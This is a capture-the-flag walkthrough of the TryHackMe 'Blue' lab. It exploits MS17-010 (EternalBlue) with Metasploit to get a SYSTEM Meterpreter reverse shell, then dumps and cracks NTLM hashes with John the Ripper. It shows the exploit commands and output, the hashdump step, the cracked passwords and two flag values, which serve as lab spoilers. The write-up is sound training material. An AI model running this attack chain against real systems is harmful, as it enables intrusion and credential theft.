# TryHackMe — Blue

A walkthrough of the **Blue** room on TryHackMe: exploiting the MS17-010 (EternalBlue) vulnerability in Windows SMBv1 to get a SYSTEM-level Meterpreter shell, dumping the SAM database, cracking the password hashes, and collecting all three flags.

| | |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Blue](https://tryhackme.com/room/blue) |
| **Difficulty** | Easy |
| **Category** | Windows / Exploitation |
| **Author** | MuhammadAnasRah |
| **Target OS** | Windows Server 2012 R2 Datacenter (build 9600) |
| **Attack box** | Kali Linux |
| **Connection** | TryHackMe OpenVPN |

---

## Table of Contents

- [Objective](#objective)
- [Setup](#setup)
- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Exploitation](#exploitation)
- [Post-Exploitation & Privilege Escalation](#post-exploitation--privilege-escalation)
- [Flags](#flags)
- [Challenges Faced](#challenges-faced)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [References](#references)

---

## Objective

Deploy and compromise a Windows machine by exploiting a common, well-documented misconfiguration — an SMBv1 service left unpatched against MS17-010, better known as **EternalBlue**. The room is built around three learning goals: Nmap scanning, Metasploit exploitation, and getting comfortable moving around inside a reverse shell.

## Setup

The target lives on TryHackMe's own network, reachable only through their OpenVPN. First step was connecting to the VPN, then pinging the target IP to confirm the tunnel was actually up before running anything against it.

```bash
sudo openvpn <your-connection-file>.ovpn
ping 10.129.191.114
```

Target IP for this run: `10.129.191.114`

## Reconnaissance & Enumeration

### Full port scan

A general scan first, to see what's actually listening on the box:

```bash
nmap -sV -sC -O 10.129.191.114
```

**Results:**

```
PORT      STATE SERVICE           VERSION
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds      Windows Server 2012 R2 Datacenter 9600 microsoft-ds
3389/tcp  open  ms-wbt-server     Microsoft Terminal Service
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152-49155/tcp open msrpc        Microsoft Windows RPC

Running: Microsoft Windows 2012
OS details: Microsoft Windows Server 2012 or 2012 R2
```

`smb-os-discovery` also leaked the computer name (`WIN-JO6REVNMMMP`) and confirmed it was sitting in the default `WORKGROUP`.

![Full Nmap port scan results](screenshots/02-nmap-full-portscan.png)

### Vulnerability scan

445/tcp open and running an old Windows Server build is the classic EternalBlue setup, so the next move was pointing Nmap's vuln scripts directly at SMB:

```bash
nmap -sV --script vuln 10.129.191.114
```

This confirmed it outright:

```
smb-vuln-ms17-010:
  VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    State: VULNERABLE
    IDs: CVE:CVE-2017-0143
    Risk factor: HIGH
    A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
```

![Nmap vulnerability scan flagging MS17-010](screenshots/01-nmap-vuln-scan.png)

That one line was the whole room, basically — a single unpatched SMBv1 service with a public, weaponized exploit sitting in Metasploit's default module list.

## Exploitation

Fired up `msfconsole` and searched for the module:

```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```

Set the target and local host, and configured the payload. (I actually set `windows/x64/shell/reverse_tcp` first out of habit, then switched to a full Meterpreter payload before running it — left both commands in below since that's genuinely what happened.)

```
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.129.191.114
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.221.131
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

**Output:**

```
[*] Started reverse TCP handler on 192.168.221.131:4444
[*] 10.129.191.114:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.191.114:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
[*] 10.129.191.114:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.191.114:445 - The target is vulnerable.
[*] 10.129.191.114:445 - shellcode size: 1283
[*] 10.129.191.114:445 - numGroomConn: 12
[*] 10.129.191.114:445 - Target OS: Windows Server 2012 R2 Datacenter 9600
[+] 10.129.191.114:445 - got good NT Trans response
[+] 10.129.191.114:445 - got good NT Trans response
[+] 10.129.191.114:445 - SMB1 session setup allocate nonpaged pool success
```

...followed shortly after by an open Meterpreter session on the target.

![EternalBlue exploit landing successfully](screenshots/03-eternalblue-exploit-success.png)

## Post-Exploitation & Privilege Escalation

The exploit itself already drops you in as `NT AUTHORITY\SYSTEM` on this box (MS17-010 runs in kernel context), so there wasn't a separate privilege escalation chain to climb — the real work here was proving it and then using that access properly:

```
meterpreter > ps
meterpreter > migrate <SYSTEM PID>
meterpreter > hashdump
```

`ps` lists every running process with its owner; I picked a PID running under `NT AUTHORITY\SYSTEM` and migrated into it so the session wouldn't die if the original exploited process got killed or restarted. `hashdump` then pulled every local account's NTLM hash straight out of the SAM database in memory.

That gave me two hashes to work with:

| Account | NTLM Hash |
|---|---|
| Jon | `ffb43f0de35be4d9917ac0cc8ad57f8d` |
| Administrator | `f3118544a831e728781d780cfdb9c1fa` |

From there, John the Ripper cracked both offline:

```bash
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=NT hashes.txt
```

**Cracked credentials:**

| Account | Password |
|---|---|
| Jon | `alqnaf` |
| Administrator | `password123` |

Two very different password choices on the same box — one that at least looks like it was trying to not be `password123`, and one that wasn't trying at all. That contrast alone says more about the account's intended use (a regular user vs. an admin account nobody expected to be attacked) than any amount of documentation could.

With SYSTEM-level Meterpreter access already in hand, I dropped into a native shell to move around the filesystem and go flag-hunting:

```
meterpreter > shell
```

## Flags

### Flag 1 — root of C:\

Listing `C:\` from inside Meterpreter turned up `flag1.txt` sitting right at the top level of the drive, alongside the usual Windows system folders:

```
meterpreter > ls
meterpreter > cat flag1.txt
```

![Meterpreter directory listing of C:\ showing flag1.txt](screenshots/04-meterpreter-flag1.png)

> The SMB connection to this box is genuinely flaky — TryHackMe warns about it, and I hit it myself, having to restart the machine partway through. The terminal output for this particular flag got cut off on my end before I saved it, so I'm not republishing a guessed value here. The locating and reading of the file is accurate; the string itself isn't included.

### Flag 2 — `C:\Windows\System32\config`

This is the folder where Windows keeps the SAM, SECURITY, and SYSTEM registry hives — the same files `hashdump` pulls from. It took a bit of searching (SMB access alone doesn't normally let you read these files live; Meterpreter's SYSTEM context is what made it possible) to figure out this was even a location worth checking.

```
C:\Windows\System32\config> dir
C:\Windows\System32\config> type flag2.txt
flag{sam_database_elevated_access}
```

![flag2.txt found inside the SAM config directory](screenshots/05-sam-config-flag2.png)

### Flag 3 — `C:\Users\Jon\Documents`

Jon's own Documents folder — a reminder that "just a normal user" accounts are still worth checking, because people leave things lying around in their own home directory.

```
C:\Users\Jon\Documents> dir
C:\Users\Jon\Documents> type flag3.txt
flag{admin_documents_can_be_valuable}
```

![flag3.txt found in Jon's Documents folder](screenshots/06-jon-documents-flag3.png)

### Summary

| Flag | Location | Value | Status |
|---|---|---|---|
| Flag 1 | `C:\flag1.txt` | not recorded (see note above) | ✅ Captured |
| Flag 2 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}` | ✅ Captured |
| Flag 3 | `C:\Users\Jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` | ✅ Captured |

## Challenges Faced

| Problem | How I Handled It |
|---|---|
| The target machine kept dropping the SMB session / becoming unresponsive mid-exploit | Terminated and restarted the TryHackMe machine, then re-ran the scan and exploit from scratch |
| Flag 2 wasn't in an obvious location | Searched for where Windows actually stores its password database, which pointed me to `System32\config` — the same folder `hashdump` reads from |

## Key Takeaways

- **One unpatched protocol can skip privilege escalation entirely.** MS17-010 doesn't give you a limited shell you then have to escalate from — it hands you SYSTEM directly, because the vulnerability lives in a kernel-mode SMB driver.
- **`hashdump` plus a wordlist is still effective in 2026.** Neither of these passwords were complex. Weak local passwords next to a critical unpatched service is exactly the kind of double failure real incidents are made of.
- **Migrating processes matters.** An exploited process can die on its own or get killed by a restart; migrating into a stable SYSTEM process is what kept the session usable long enough to actually explore the filesystem.
- **Flags in "boring" places are still worth checking.** A flag sitting in a regular user's Documents folder is a small-scale version of a much bigger real-world problem: sensitive files end up in places nobody thinks to lock down because they don't look "important."

## Tools Used

- [Nmap](https://nmap.org/) — service and vulnerability scanning
- [Metasploit Framework](https://www.metasploit.com/) — exploitation (`exploit/windows/smb/ms17_010_eternalblue`) and post-exploitation (Meterpreter)
- [John the Ripper](https://www.openwall.com/john/) — offline NTLM hash cracking

## References

- [TryHackMe — Blue](https://tryhackme.com/room/blue)
- [Microsoft Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [Microsoft — Customer Guidance for WannaCrypt Attacks](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)

---



